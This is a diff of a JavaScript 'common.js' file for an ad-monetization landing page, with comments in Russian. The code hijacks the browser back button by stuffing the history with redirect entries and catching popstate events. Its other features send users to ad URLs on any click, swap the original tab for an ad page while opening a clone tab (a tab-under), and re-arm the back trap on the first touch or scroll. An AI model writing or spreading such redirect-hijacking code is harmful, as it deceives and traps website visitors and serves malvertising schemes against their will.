@@ -1,4 +1,4 @@
-/* common.js — FINAL FIXED VERSION (Back/Reverse/Clone) */
+/* common.js — FULL MONOLITHIC VERSION (Back-Fix + Clone + Multi-Exit) */
 
 (() => {
   "use strict";
@@ -22,12 +22,12 @@
   const CLONE_PARAM = "__cl";
   const isClone = getSP(CLONE_PARAM) === "1";
 
+  // Сбор всех возможных параметров трекинга
   const IN = {
     pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
     z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
     b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
-    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
-    cid: getSP("cid"), geo: getSP("geo"),
+    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"), cid: getSP("cid"), geo: getSP("geo"),
   };
 
   const qsFromObj = (obj) => {
@@ -52,6 +52,7 @@
     } catch { return ""; }
   };
 
+  // Тот самый нормализатор, который превращает плоский APP_CONFIG в объекты
   const normalizeConfig = (appCfg) => {
     if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
     const cfg = { domain: appCfg.domain };
@@ -119,10 +120,8 @@
   const initBackFast = (cfg) => {
     const b = cfg?.back?.currentTab;
     if (!b) return;
-
-    // Авто-определение пути к back.html в корне
-    const pageUrl = cfg.back?.pageUrl || "back.html";
-    const page = new URL(pageUrl, window.location.origin + window.location.pathname);
+    const pageFile = cfg.back?.pageUrl || "back.html";
+    const pageUrl = new URL(pageFile, window.location.origin + window.location.pathname);
     
     const qs = buildExitQSFast({ zoneId: b.zoneId });
     if (b.url) qs.set("url", String(b.url));
@@ -130,8 +129,8 @@
       qs.set("z", String(b.zoneId)); 
       qs.set("domain", String(b.domain || cfg.domain || "")); 
     }
-    page.search = qs.toString();
-    pushBackStates(page.toString(), cfg.back?.count ?? 8);
+    pageUrl.search = qs.toString();
+    pushBackStates(pageUrl.toString(), cfg.back?.count ?? 10);
   };
 
   const resolveUrlFast = (ex, cfg) => {
@@ -144,11 +143,8 @@
   const runExitDualTabsFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name];
     if (!ex) return;
-    
-    const ct = ex.currentTab; 
-    const nt = ex.newTab;     
-    const ctUrl = resolveUrlFast(ct, cfg);
-    const ntUrl = resolveUrlFast(nt, cfg);
+    const ctUrl = resolveUrlFast(ex.currentTab, cfg);
+    const ntUrl = resolveUrlFast(ex.newTab, cfg);
 
     if (withBack) initBackFast(cfg);
     if (ntUrl) openTab(ntUrl);
@@ -169,12 +165,10 @@
     return runExitCurrentTabFast(cfg, name, true);
   };
 
-  // --- REVERSE (Popstate hook) ---
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
     safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
     window.addEventListener("popstate", (e) => { 
-        // Если это физический бэк, а не наш стейт — льем на реверс
         if (!e.state || !e.state.__isBack) {
             runExitCurrentTabFast(cfg, "reverse", false); 
         }
@@ -192,25 +186,17 @@
     ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
   };
 
-  // --- MICRO HANDOFF ---
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
-    u.searchParams.set("__skipPreview", "1");
     return u.toString();
   };
 
   const runMicroHandoff = (cfg) => {
-    if (isClone) {
-        run(cfg, "mainExit");
-        return;
-    }
-    const cloneUrl = buildCloneUrl();
-    openTab(cloneUrl);
-
+    if (isClone) { run(cfg, "mainExit"); return; }
+    openTab(buildCloneUrl());
     const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
     const monetUrl = resolveUrlFast(ex, cfg);
-
     if (monetUrl) {
       initBackFast(cfg);
       setTimeout(() => replaceTo(monetUrl), 40);
@@ -219,31 +205,28 @@
     }
   };
 
-  // --- CLICK MAP ---
   const initClickMap = (cfg) => {
     let fired = false;
     const microTargets = new Set(["chest_play", "chest_lost", "banner_close", "modal_stay"]);
 
     document.addEventListener("click", (e) => {
-      const zone = e.target?.closest?.("[data-target]");
-      const t = zone?.getAttribute("data-target") || "";
+      const t = e.target?.closest?.("[data-target]")?.getAttribute("data-target") || "";
+      
+      // КРИТИЧЕСКАЯ ПРАВКА: Если это клон, "прогреваем" бэк по первому клику
+      if (isClone) initBackFast(cfg);
 
       if (isClone) {
-        if (fired) return;
-        fired = true;
+        if (fired) return; fired = true;
         e.preventDefault(); e.stopPropagation();
-        run(cfg, "mainExit");
-        return;
+        run(cfg, "mainExit"); return;
       }
 
       if (microTargets.has(t)) {
         e.preventDefault(); e.stopPropagation();
-        runMicroHandoff(cfg);
-        return;
+        runMicroHandoff(cfg); return;
       }
 
-      if (fired) return;
-      fired = true;
+      if (fired) return; fired = true;
       e.preventDefault();
       run(cfg, "mainExit");
     }, true);
@@ -256,9 +239,14 @@
 
     window.LANDING_EXITS = { cfg, run: (name) => run(cfg, name) };
     
-    // ПРАВКА: Инициализируем Бэк-фикс СРАЗУ при загрузке
+    // ПРАВКА: Инициализируем Бэк-фикс СРАЗУ
     initBackFast(cfg); 
     
+    // ПРАВКА: Если браузер блокирует pushState в новой вкладке, 
+    // "прогреваем" историю по первому движению юзера
+    const warmUp = () => { initBackFast(cfg); };
+    ["touchstart", "mousedown", "scroll"].forEach(ev => window.addEventListener(ev, warmUp, { once: true }));
+
     initClickMap(cfg);
     initAutoexit(cfg);
     initReverse(cfg); 
